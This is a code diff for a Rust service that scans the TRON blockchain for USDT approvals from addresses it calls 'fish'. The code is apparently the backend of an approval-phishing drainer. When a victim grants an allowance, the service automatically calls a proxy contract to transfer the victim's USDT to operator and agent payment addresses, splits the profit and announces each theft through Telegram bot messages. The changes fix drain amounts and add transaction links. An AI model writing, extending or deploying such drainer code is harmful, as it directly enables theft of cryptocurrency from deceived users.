@@ -1,5 +1,4 @@
-use std::{str::FromStr, time::Duration};
-
+use anychain_core::AddressError;
 use anychain_core::hex::{self, FromHex};
 use anychain_tron::{
     TronAddress,
@@ -8,8 +7,14 @@ use anychain_tron::{
 use anyhow::{anyhow, bail};
 use ethabi::Function;
 use rust_decimal::prelude::*;
+use std::ops::ControlFlow;
+use std::{str::FromStr, time::Duration, u128};
 // use ethabi::{Function, ParamType, Token, encode};
+use kameo::actor::{ActorId, WeakActorRef};
+use kameo::error::{ActorStopReason, PanicError};
+use kameo::message::Context;
 use kameo::{Actor, actor::ActorRef, mailbox::unbounded, prelude::Message};
+use kameo_actors::message_bus::Register;
 use primitive_types::U256;
 use rand::random_range;
 use reqwest::{Client, RequestBuilder};
@@ -30,6 +35,8 @@ use thiserror::Error;
 use tokio::spawn;
 use tracing::error;
 
+use crate::bus::event::event_manager::{EventManager, EventManagerType};
+use crate::bus::event::events::data_cache_updated_event::DataCacheUpdatedEvent;
 use crate::{
     daili::daili_cache::{self},
     daili_group::daili_group_cache,
@@ -51,6 +58,7 @@ use crate::{
     },
 };
 use entities::entities::fish::Model as FishModel;
+use crate::utils::tron::make_transaction_details_url;
 
 const TRANSFER_DISCRIMINATOR: &'static str = "a9059cbb";
 const TRANSFER_FROM_DISCRIMINATOR: &'static str = "23b872dd";
@@ -60,9 +68,15 @@ const INCREASE_APPROVE_DISCRIMINATOR: &'static str = "d73dd623";
 const DEFAULT_SHARED_PROFIT: f64 = 0.5;
 
 #[derive(Debug, Error, Clone)]
-pub enum TronBlockScannerError {}
+pub enum TronBlockScannerError {
+    #[error("事件管理器未启动")]
+    EventManagerNotStart,
+    #[error("监听数据更新事件失败: {0}")]
+    ListenDataUpdatedEventFailed(String),
+}
 
 pub(crate) struct TronBlockScanner {
+    event_manager: ActorRef<EventManagerType>,
     last_processed_block: Option<u64>,
     base58_usdt_contract: String,
     hex_usdt_contract: String,
@@ -81,12 +95,13 @@ pub(crate) struct TronBlockScanner {
 }
 
 impl TronBlockScanner {
-    pub async fn new(bot: Bot) -> TronBlockScanner {
+    pub async fn new(bot: Bot, event_manager: ActorRef<EventManagerType>) -> TronBlockScanner {
         let config = &config_helper::CONFIG.tron;
         let full_host = config.full_host.clone();
         let address = anychain_tron::TronAddress::from_str(&config.usdt_contract).unwrap();
         let base58_usdt_contract = address.to_base58();
         let hex_usdt_contract = address.to_hex();
+
         let tron_grid_keys = options_cache::tron_grid_keys();
         let permission_addresses = options_cache::permission_addresses();
         let contract_owner_private_key =
@@ -98,6 +113,7 @@ impl TronBlockScanner {
         let db_conn = database::connection::get_connection().await.unwrap();
         // let contract_metod = options_cache::map_contract_method(|m|m.value).flatten();
         TronBlockScanner {
+            event_manager,
             last_processed_block: None,
             http_client: Client::new(),
             full_host,
@@ -117,7 +133,10 @@ impl TronBlockScanner {
         supervisor: &ActorRef<impl Actor>,
         bot: Bot,
     ) -> anyhow::Result<ActorRef<Self>> {
-        let scanner = TronBlockScanner::new(bot).await;
+        let event_manager = EventManager::actor_ref()
+            .await?
+            .ok_or_else(|| TronBlockScannerError::EventManagerNotStart)?;
+        let scanner = TronBlockScanner::new(bot, event_manager).await;
         let actor_ref =
             Actor::spawn_link_with_mailbox(supervisor, scanner, unbounded::<Self>()).await;
         let _ = actor_ref.wait_for_startup_result().await?;
@@ -133,6 +152,12 @@ impl TronBlockScanner {
 
                 let block_number = block.block_header.raw_data.number;
                 if let Some(last) = self.last_processed_block {
+                    if last >= block_number {
+                        error!("same block: {block_number}");
+                        Self::schedule_next_scanning(acror_ref);
+                        return;
+                    }
+
                     for number in last + 1..block_number {
                         match self.fetch_block_by_number(number).await {
                             Ok(block) => {
@@ -145,10 +170,10 @@ impl TronBlockScanner {
                             Err(e) => error!("获取区块数据出错，区块编号：{number}, error: {e:?}"),
                         }
                     }
-
-                    // 处理当前区块
-                    self.handle_block(block).await;
                 }
+                self.last_processed_block = Some(block_number);
+                // 处理当前区块
+                self.handle_block(block).await;
             }
             Err(e) => {
                 error!("获取当前区块数据出错: {e:?}")
@@ -360,8 +385,6 @@ impl TronBlockScanner {
                 }
             }
         }
-
-        todo!("handle usde transfer");
     }
 
     async fn handle_usdt_approve(
@@ -377,9 +400,16 @@ impl TronBlockScanner {
             return;
         };
         let config = &config_helper::CONFIG.tron;
-        let contract_address = &parameter.contract_address;
+        let contract_address = match TronAddress::from_str(&parameter.contract_address) {
+            Ok(addr) => addr.to_base58(),
+            Err(e) => {
+                error!("转换contract_address出错: {e:?}");
+                return;
+            }
+        };
         // 只处理usdt的
-        if contract_address != &config.usdt_contract {
+        if contract_address != config.usdt_contract {
+            // error!("contract address 不匹配,收到 {contract_address}, 配置中: {}", &config.usdt_contract);
             return;
         }
         let spender_address =
@@ -397,14 +427,25 @@ impl TronBlockScanner {
                     return;
                 }
             };
-        let transfer_amount_in = match u64::from_str_radix(&parameter.data[72..], 16) {
-            Ok(amount) => amount / 1_000_000,
+        let (transfer_amount_in, transfer_amount_in_decimal) = match u128::from_str_radix(&parameter.data[72..], 16) {
+            Ok(amount) => (amount, amount as f64 / 1_000_000.),
             Err(e) => {
                 error!("解析Transfer指令中的amount时出错：{e:?}");
                 return;
             }
         };
-        let (fish_trx, fish_usdt) = match self.query_balance(&parameter.owner_address).await {
+        let owner_address = match TronAddress::from_str(&parameter.owner_address) {
+            Ok(addr) => addr,
+            Err(e) => {
+                error!("转换OwnerAddress失败: {e:?}");
+                return;
+            }
+        };
+        let owner_address_base58 = owner_address.to_base58();
+        let (fish_trx, fish_usdt) = match self
+            .query_balance(&parameter.owner_address /*使用hex格式的地址*/)
+            .await
+        {
             Ok((trx, usdt)) => (Some(trx), Some(usdt)),
             Err(e) => {
                 error!("查询鱼的余额出错: {e:?}");
@@ -413,26 +454,25 @@ impl TronBlockScanner {
         };
         // 获取其unique_id: 先从fish_browse中获取,如果没有，再尝试获取配置中的缺省unique_id
         // todo: 从缓存中获取可能获取到旧数据，因为缓存是N秒更新一次
-        let unique_id =
-            match fish_browse_cache::map(&parameter.owner_address, |m| m.unique_id.clone())
-                .flatten()
-            {
+        let unique_id = match fish_browse_cache::map(&owner_address_base58, |m| m.unique_id.clone())
+            .flatten()
+        {
+            Some(u) => u,
+            None => match options_cache::default_unique_id() {
                 Some(u) => u,
-                None => match options_cache::default_unique_id() {
-                    Some(u) => u,
-                    None => {
-                        error!("鱼没有代理id（unique_id),也没有配置默认unique_id");
-                        return;
-                    }
-                },
-            };
+                None => {
+                    error!("鱼没有代理id（unique_id),也没有配置默认unique_id");
+                    return;
+                }
+            },
+        };
         let (unique_id, daili_user_name, daili_group_id, daili_threshold, daili_payment_address) =
             match daili_cache::map(&unique_id, |m| {
                 (
                     m.unique_id.clone(),
                     m.username.clone(),
                     m.groupid.clone(),
-                    m.threshold.clone(),
+                    m.threshold,
                     m.payment_address.clone(),
                 )
             }) {
@@ -452,11 +492,11 @@ impl TronBlockScanner {
         };
         // let now = chrono::DateTime::from_timestamp_millis(rust_utils::time::now_millis()).unwrap();
 
-        let existing_fish = fish_cache::find(&parameter.owner_address, "TRC");
+        let existing_fish = fish_cache::find(&owner_address_base58, "TRC");
         let approvval_status;
         let additional_note;
-        if transfer_amount_in == 0 || transfer_amount_in < 200 {
-            if transfer_amount_in == 0 {
+        if transfer_amount_in_decimal < 1. {
+            if transfer_amount_in_decimal <= 0.01 {
                 approvval_status = "❌ <code>取消授权 额度 0 USDT</code>".to_string();
                 additional_note = "❌ 注：因该地址已取消授权，已从鱼池列表中删除".to_string();
                 if let Some(id) = existing_fish {
@@ -466,10 +506,13 @@ impl TronBlockScanner {
                         .await;
                 }
             } else {
-                approvval_status = format!("❌ <code>授权额度 {} USDT</code>", transfer_amount_in);
+                approvval_status = format!(
+                    "❌ <code>授权额度 {} USDT</code>",
+                    transfer_amount_in_decimal
+                );
                 additional_note = "❌ 注：因该地址的授权额度太低，将不加入鱼池列表".to_string();
                 if let Some(id) = existing_fish {
-                    let remark = format!("授权额度: {}", transfer_amount_in);
+                    let remark = format!("授权额度: {}", transfer_amount_in_decimal);
                     let auth_status = 0;
                     self.update_fish_status_remark(id, remark, auth_status)
                         .await;
@@ -477,20 +520,21 @@ impl TronBlockScanner {
             }
         } else {
             approvval_status = "✅ <code>授权成功</code>".to_string();
-            let threshold = daili_threshold.unwrap_or(0) as f64 / 1_000_000.;
+            let threshold_with_decimal = daili_threshold.unwrap_or(0) as f64 / 1_000_000.;
             let fish_address = &parameter.owner_address;
             let fish_usdt_unwraped = fish_usdt.unwrap_or(0);
-            let fish_usdt_with_decimal = fish_usdt_unwraped as f64 / 1_000_000.;
+            let fish_usdt_can_transfer = fish_usdt_unwraped.min(transfer_amount_in);
+            let fish_usdt_can_transfer_with_decimal = fish_usdt_can_transfer as f64 / 1_000_000.;
             additional_note = format!(
-                "✅ 当前默认提币阈值为 <code>{threshold} USDT</code>\n\n您可以通过命令 <code>修改阈值 {fish_address} 10000</code> 将阈值修改为10000或者你想要设置的阈值;"
+                "✅ 当前默认提币阈值为 <code>{threshold_with_decimal} USDT</code>\n\n您可以通过命令 <code>修改阈值 {fish_address} 10000</code> 将阈值修改为10000或者你想要设置的阈值;"
             );
-            if fish_usdt_with_decimal >= threshold && fish_usdt_unwraped > 1 {
+            if fish_usdt_can_transfer_with_decimal >= threshold_with_decimal && fish_usdt_can_transfer > 1 {
                 match self
                     .transfer_fish_usdt(
                         &spender_address.to_base58(),
                         fish_address,
                         &payment_address,
-                        fish_usdt_unwraped - 1,
+                         fish_usdt_can_transfer - 1,
                         &daili_user_name,
                         &daili_payment_address,
                         &daili_group_id,
@@ -574,7 +618,7 @@ impl TronBlockScanner {
             self.send_approve_bot_message(
                 group_id,
                 &user_name_display,
-                &parameter.owner_address,
+                &owner_address_base58,
                 &spender_address.to_base58(),
                 &approvval_status,
                 &additional_note,
@@ -588,7 +632,7 @@ impl TronBlockScanner {
 
     async fn send_approve_bot_message(
         &self,
-        groupid: String,
+        group_id: String,
         user_name: &str,
         fish_address: &str,
         permission_address: &str,
@@ -600,7 +644,7 @@ impl TronBlockScanner {
     ) {
         match Self::send_approve_bot_message_with_bot(
             &self.bot,
-            groupid,
+            group_id,
             user_name,
             fish_address,
             permission_address,
@@ -771,7 +815,12 @@ impl TronBlockScanner {
         daili_payment_address: &Option<String>,
         group_id: &Option<String>,
     ) -> anyhow::Result<()> {
-        let token = anychain_tron::TronAddress::from_hex(&self.hex_usdt_contract)?;
+        error!(
+            "transfer fish, permission: {permission_contract_address}, fish: {fish_address},\
+         payment: {payment_address}, daili payment: {daili_payment_address:?}, usdt: {}",
+            self.hex_usdt_contract
+        );
+        let token = anychain_tron::TronAddress::from_str(&self.hex_usdt_contract)?;
         if let Some(daili_payment_address) = daili_payment_address {
             let share_profit = if let Some(group_id) = group_id {
                 daili_group_cache::map(group_id, |m| m.share_profits).flatten()
@@ -781,7 +830,7 @@ impl TronBlockScanner {
             let share_profit =
                 share_profit.unwrap_or_else(|| Decimal::from_f64(DEFAULT_SHARED_PROFIT).unwrap());
             if share_profit.is_zero() {
-                self.execute_usdt_transfer(
+                let tx_id = self.execute_usdt_transfer(
                     permission_contract_address,
                     fish_address,
                     payment_address,
@@ -796,12 +845,13 @@ impl TronBlockScanner {
                         Some(daili_payment_address),
                         amount as i128,
                         None,
+                        &tx_id,
                         &now_date_time_str(),
                     )
                     .await;
                 }
             } else if share_profit.is_one() {
-                self.execute_usdt_transfer(
+                let tx_id = self.execute_usdt_transfer(
                     permission_contract_address,
                     fish_address,
                     daili_payment_address,
@@ -816,6 +866,7 @@ impl TronBlockScanner {
                         Some(daili_payment_address),
                         amount as i128,
                         Some(amount as i128),
+                        &tx_id,
                         &now_date_time_str(),
                     )
                     .await;
@@ -868,7 +919,7 @@ impl TronBlockScanner {
                 });
                 // todo: 可能只有某一个任务成功，暂时未处理
                 my_transfer_task.await??;
-                daili_transfer_task.await??;
+                let tx_id = daili_transfer_task.await??;
                 if let Some(group_id) = group_id {
                     self.send_transfer_fish_usdt_notice(
                         group_id.clone(),
@@ -877,13 +928,14 @@ impl TronBlockScanner {
                         Some(daili_payment_address.as_str()),
                         amount as i128,
                         Some(daili_amount as i128),
+                        &tx_id,
                         &now_date_time_str(),
                     )
                     .await;
                 }
             }
         } else {
-            self.execute_usdt_transfer(
+            let tx_id = self.execute_usdt_transfer(
                 permission_contract_address,
                 fish_address,
                 payment_address,
@@ -898,6 +950,7 @@ impl TronBlockScanner {
                     daili_payment_address.as_ref().map(|s| s.as_str()),
                     amount as i128,
                     None,
+                    &tx_id,
                     &now_date_time_str(),
                 )
                 .await;
@@ -915,6 +968,7 @@ impl TronBlockScanner {
         daili_payment_address: Option<&str>,
         total_amount: i128,
         share_amount: Option<i128>,
+        tx_id: &str,
         time: &str,
     ) where
         C: Into<Recipient>,
@@ -927,6 +981,7 @@ impl TronBlockScanner {
             daili_payment_address,
             total_amount,
             share_amount,
+            tx_id,
             time,
         )
         .await
@@ -946,6 +1001,7 @@ impl TronBlockScanner {
         daili_payment_address: Option<&str>,
         total_amount: i128,
         share_amount: Option<i128>,
+        tx_id: &str,
         time: &str,
     ) -> anyhow::Result<()>
     where
@@ -967,6 +1023,7 @@ impl TronBlockScanner {
         } else {
             "未设置"
         };
+        let tx_url = make_transaction_details_url(&config_helper::CONFIG.tron.full_host, tx_id);
         let notification_message = format!(
             "【🎣 TRC-USDT自动转账通知🎣】
 
@@ -974,6 +1031,7 @@ impl TronBlockScanner {
 💳 收款地址：@{daili_user_name} <code>{daili_payment_address_real}</code>
 💸 成功划扣：<code>{total_real} USDT</code>
 💎 代理分润：<code>{share}</code>
+🔗 交易详情：<code>{tx_url}</code>
 
 时间: {time}
 "
@@ -996,7 +1054,7 @@ impl TronBlockScanner {
         amount: u128,
         private_key: String,
         api_key: Option<String>,
-    ) -> anyhow::Result<()> {
+    ) -> anyhow::Result<String> {
         let function_name = "proxyTransfer";
         let amount = U256::from(amount);
         let data = contract_function_call(
@@ -1009,9 +1067,9 @@ impl TronBlockScanner {
             ],
         );
         let TronPublicKeyBundle { base58, .. } = private_key_2_public_key(&private_key)?;
-        let (block_number, block_hash) =
-            if let Some(BlockBrief { block_id, number }) = block::get_block_brief().await {
-                (number as i64, block_id)
+        let block_brief =
+            if let Some(block_brief) = block::get_block_brief().await {
+                block_brief
             } else {
                 bail!("还未初始化tron block");
             };
@@ -1026,8 +1084,7 @@ impl TronBlockScanner {
             &contract,
             data,
             50_000_000,
-            block_number,
-            &block_hash,
+            &block_brief,
             &private_key,
         )?;
         let full_host = &config_helper::CONFIG.tron.full_host;
@@ -1039,11 +1096,12 @@ impl TronBlockScanner {
         )
         .await?;
         if resp.success() {
+            error!("send transfer success: {}, msg: {:?}", resp.tx_id, resp.message);
+            Ok(resp.tx_id)
             // 发送成功
         } else {
             bail!(resp.message.unwrap_or_else(|| "广播交易失败".to_string()))
         }
-        Ok(())
     }
 
     /// 地址格式都是base58(TXXX)
@@ -1053,13 +1111,16 @@ impl TronBlockScanner {
         from: &str,
         to: &str,
         amount: u128,
-    ) -> anyhow::Result<()> {
+    ) -> anyhow::Result<String> {
         // let contract = if let Some(address) = options_cache::random_one_permission_address() {
         //     address
         // } else {
         //     bail!("没有配置授权合约地址");
         // };
-        let token = anychain_tron::TronAddress::from_hex(&self.hex_usdt_contract)?;
+        error!(
+            "execute usdt transfer, contract: {permission_contract_address}, from: {from}, to: {to}"
+        );
+        let token = TronAddress::from_hex(&self.hex_usdt_contract)?;
         let from = anychain_tron::TronAddress::from_str(from)?;
         let to = anychain_tron::TronAddress::from_str(to)?;
         let amount = U256::from(amount);
@@ -1077,19 +1138,19 @@ impl TronBlockScanner {
         );
         let private_key = &self.contract_owner_private_key;
         let TronPublicKeyBundle { base58, .. } = private_key_2_public_key(&private_key)?;
-        let (block_number, block_hash) =
-            if let Some(BlockBrief { block_id, number }) = block::get_block_brief().await {
-                (number as i64, block_id)
+        let block_brief =
+            if let Some(block_brief) = block::get_block_brief().await {
+                block_brief
             } else {
                 bail!("还未初始化tron block");
             };
+        error!("before build contract transaction");
         let tx = build_contract_transaction(
             &base58,
             permission_contract_address,
             data,
             50_000_000,
-            block_number,
-            &block_hash,
+            &block_brief,
             private_key,
         )?;
         let api_key = self.random_one_tron_grid_key();
@@ -1097,11 +1158,11 @@ impl TronBlockScanner {
             send_transaction_with_key(&self.http_client, &self.full_host, tx, api_key).await?;
         if resp.success() {
             // 发送成功
+            Ok(resp.tx_id)
         } else {
             bail!(resp.message.unwrap_or_else(|| "广播交易失败".to_string()))
         }
 
-        Ok(())
     }
 
     async fn query_balance(&mut self, address: &str) -> anyhow::Result<(u64, u128)> {
@@ -1144,8 +1205,11 @@ impl TronBlockScanner {
             .json(&body)
             .send()
             .await?
-            .json::<Account>()
+            .text()
             .await?;
+        let account = serde_json::from_str::<Account>(&account)?;
+        // .json::<Account>()
+        // .await?;
 
         Ok(account.balance)
     }
@@ -1157,7 +1221,8 @@ impl TronBlockScanner {
         contract_base58: &str,
     ) -> anyhow::Result<u128> {
         let owner_address_hex = Self::base58_to_tron_hex(owner_address_base58)?;
-        let target_address_hex = Self::base58_to_tron_hex(target_address_base58)?;
+        let target_address = TronAddress::from_str(target_address_base58)?;
+        let target_address_hex = target_address.to_hex();
         let contract_hex = Self::base58_to_tron_hex(contract_base58)?;
         let function = Function {
             name: "balanceOf".to_string(),
@@ -1218,7 +1283,7 @@ impl TronBlockScanner {
     }
 
     async fn fetch_block_by_number(&mut self, number: u64) -> anyhow::Result<Option<Block>> {
-        let url = format!("{}/walletsolidity/getblockbynum", &self.full_host);
+        let url = format!("{}/wallet/getblockbynum", &self.full_host);
         let builder = self.prepare_tron_grid_request(self.http_client.post(url));
         let body = json!(
           {
@@ -1268,12 +1333,12 @@ impl TronBlockScanner {
     // }
 
     fn prepare_require_trx_balance(&mut self) -> RequestBuilder {
-        let url = format!("{}/walletsolidity/getaccount", self.full_host);
+        let url = format!("{}/wallet/getaccount", self.full_host);
         self.prepare_tron_grid_request(self.http_client.post(url))
     }
 
     fn prepare_requery_trc_20_balance(&mut self) -> RequestBuilder {
-        let url = format!("{}/walletsolidity/triggerconstantcontract", self.full_host);
+        let url = format!("{}/wallet/triggerconstantcontract", self.full_host);
         let builder = self.prepare_tron_grid_request(self.http_client.post(url));
         builder
     }
@@ -1311,7 +1376,7 @@ impl TronBlockScanner {
     async fn fetch_current_block(&mut self) -> anyhow::Result<Block> {
         let builder = self.prepare_tron_grid_request(
             self.http_client
-                .get(format!("{}/walletsolidity/getnowblock", &self.full_host)),
+                .get(format!("{}/wallet/getnowblock", &self.full_host)),
         );
         // let resp = builder.send().await?;
         // let text = resp.text().await?;
@@ -1319,6 +1384,21 @@ impl TronBlockScanner {
         // let block: Block = serde_json::from_str(&text)?;
         let block = builder.send().await?.json::<Block>().await?;
         Ok(block)
+    }
+
+    async fn handle_data_cache_updated_event(&mut self) {
+        let tron_grid_keys = options_cache::tron_grid_keys();
+        let permission_addresses = options_cache::permission_addresses();
+        self.tron_grid_keys = tron_grid_keys;
+        self.permission_addresses = permission_addresses;
+        match options_cache::map_contract_owner_private_key(|m| m.value.clone()).flatten() {
+            None => {
+                error!("数据更新后，未能获取：contract_owner_private_key");
+            }
+            Some(contract_owner_private_key) => {
+                self.contract_owner_private_key = contract_owner_private_key;
+            }
+        }
     }
 }
 
@@ -1331,10 +1411,26 @@ impl Actor for TronBlockScanner {
         mut args: Self::Args,
         actor_ref: kameo::prelude::ActorRef<Self>,
     ) -> Result<Self, Self::Error> {
+        args.event_manager
+            .tell(Register(
+                actor_ref.clone().recipient::<DataCacheUpdatedEvent>(),
+            ))
+            .await
+            .map_err(|e| TronBlockScannerError::ListenDataUpdatedEventFailed(format!("{e:?}")))?;
         args.scan_block(actor_ref).await;
 
         Ok(args)
     }
+
+    // async fn on_panic(
+    //     &mut self,
+    //     actor_ref: WeakActorRef<Self>,
+    //     err: PanicError,
+    // ) -> Result<ControlFlow<ActorStopReason>, Self::Error> {
+    //     error!("TronBlockScanner panicked: {err:?}, but will continue");
+    //     Ok(ControlFlow::Continue(()))
+    // }
+
 }
 
 struct ScanBlockCmd;
@@ -1374,4 +1470,16 @@ impl From<&FishModel> for NecessaryFishInfo {
 #[derive(Debug, Deserialize)]
 struct TriggerResp {
     constant_result: Option<Vec<String>>,
+}
+
+impl Message<DataCacheUpdatedEvent> for TronBlockScanner {
+    type Reply = ();
+
+    async fn handle(
+        &mut self,
+        _msg: DataCacheUpdatedEvent,
+        _ctx: &mut Context<Self, Self::Reply>,
+    ) -> Self::Reply {
+        self.handle_data_cache_updated_event().await;
+    }
 }
